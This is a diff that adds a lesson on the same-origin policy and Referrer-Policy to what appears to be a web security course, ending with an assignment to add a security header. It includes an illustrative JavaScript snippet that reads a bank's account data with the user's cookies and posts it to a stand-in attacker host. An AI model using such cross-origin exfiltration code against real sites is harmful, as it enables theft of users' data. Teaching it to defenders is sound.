@@ -156,3 +156,51 @@ In the existing security middleware, add frame-ancestors 'self' to CSP and send 
 With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.
 
 You can stop Bearly Evil after submitting the lesson.
+
+### L9: Same-Origin and Referrer Policies
+Same-Origin and Referrer Policies
+The same-origin policy stops client-side JavaScript from reading data from another origin unless that origin explicitly allows it.
+
+An origin combines scheme (https), host (api.example.com), and port (443), so changing any one of them changes the origin.
+
+Cross-Origin Reads
+Imagine a user is logged into https://bank.example.com, then visits an attacker-controlled sibling origin at https://evil.example.com. Without the same-origin policy, the attacker's page could do this:
+
+// make a request for account details using the user's
+// signed-in session cookie
+const response = await fetch("https://bank.example.com/account", {
+  credentials: "include",
+});
+const account = await response.json();
+
+// send the sensitive data back to the attacker's server
+await fetch("https://evil.example.com/steal", {
+  method: "POST",
+  body: JSON.stringify(account),
+});
+
+The two origins are same-site (example.com), so the browser may send the bank's SameSite cookie when fetch opts into credentials, but it will not let JavaScript on evil.example.com read the response unless the bank explicitly allows it.
+
+The same-origin policy mostly restricts reads, but not all writes. A malicious page might be able to submit a form or load an image from another origin, but reading private response data is blocked by default.
+
+Referrer Policy
+The same-origin policy does not control how much of the current URL a browser sends in the Referer request header when a user follows a link or loads a resource.
+
+The HTTP Referer request header identifies the page that initiated a request. For example, when someone follows a Google or GitHub link to Boot.dev, the request to our homepage may contain a Google or GitHub URL in its Referer header (very useful for analytics).
+
+Instead, an explicit Referrer-Policy header keeps that behavior predictable:
+
+Referrer-Policy: strict-origin-when-cross-origin
+
+It allows the full URL on same-origin requests, sends only the origin on HTTPS-to-HTTPS cross-origin requests, and sends no referrer when navigating from HTTPS to HTTP. Modern browsers use this policy by default, but setting the header makes your application's choice explicit.
+
+So, the same-origin policy limits cross-origin reads, while the referrer policy limits the URL information sent with requests.
+
+Assignment
+Bearly Secure relies on browser defaults. Send Referrer-Policy: strict-origin-when-cross-origin on every response.
+
+Add the header to Bearly Secure's global security middleware.
+
+Start the app.
+
+With Bearly Secure still running, run and submit the CLI tests from the project root.
